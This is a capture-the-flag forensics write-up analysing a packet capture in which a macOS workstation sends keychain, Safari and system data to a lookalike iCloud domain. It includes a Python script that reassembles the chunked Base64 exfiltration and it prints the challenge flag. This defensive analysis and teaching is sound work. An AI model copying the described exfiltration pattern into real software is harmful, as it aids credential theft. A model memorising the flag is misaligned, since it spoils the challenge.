## Description

A macOS developer workstation had apparently exfiltrated browser data, a keychain and system info to a server pretending to be Apple iCloud. The artifact was `capture.zip`, containing `capture.pcap`.

![The packet capture challenge description](writeups/ukiddgj/img/init-packet-capture.webp)

> The challenge title wasn't visible in my screenshot, so I'm calling it by what it is.

## Network analysis

After extracting the PCAP, I looked at the HTTP traffic. There were **58 POST requests** to:

```http
Host: update.icloud-sync.cc
POST /api/collect
Content-Type: application/json
```

Each JSON body had an `id` and a Base64 `part`. The parts arrived out of order, so joining them in capture order gives a broken file. Sorting by `id` from 0 to 57 and Base64-decoding the result gave a ZIP.

Since every POST body is in a single packet in this capture, this works:

```python
import zipfile, struct, json, base64

pcap = zipfile.ZipFile("capture.zip").read("capture.pcap")
offset, parts = 24, {}
while offset + 16 <= len(pcap):
    _, _, length, _ = struct.unpack_from("<IIII", pcap, offset)
    offset += 16
    packet = pcap[offset:offset + length]
    offset += length
    pos = packet.find(b"POST /api/collect ")
    if pos == -1:
        continue
    body_start = packet.find(b"\r\n\r\n", pos)
    if body_start == -1:
        continue
    obj = json.loads(packet[body_start + 4:].decode())
    parts[obj["id"]] = obj["part"]

zip_data = base64.b64decode("".join(parts[i] for i in sorted(parts)))
open("recovered_exfil.zip", "wb").write(zip_data)
```

The ZIP had a system profiler report, a keychain dump, a TCC database, Finder preferences and Safari data. The keychain dump had a `backup-key` field holding another Base64 string. I've left the unrelated credentials out of this writeup.

```bash
printf '%s' 'SW5JdHtrM3ljaDRpbl9jcnVtYnNfbDM0azNkXzB2M3JfcGw0MW5faHR0cH0=' | base64 -d
```

## Flag

```flag
InIt{k3ych4in_crumbs_l34k3d_0v3r_pl41n_http}
```

## Takeaway

Exfiltrating over plain HTTP exposes both the stolen archive and whatever secrets are inside it.
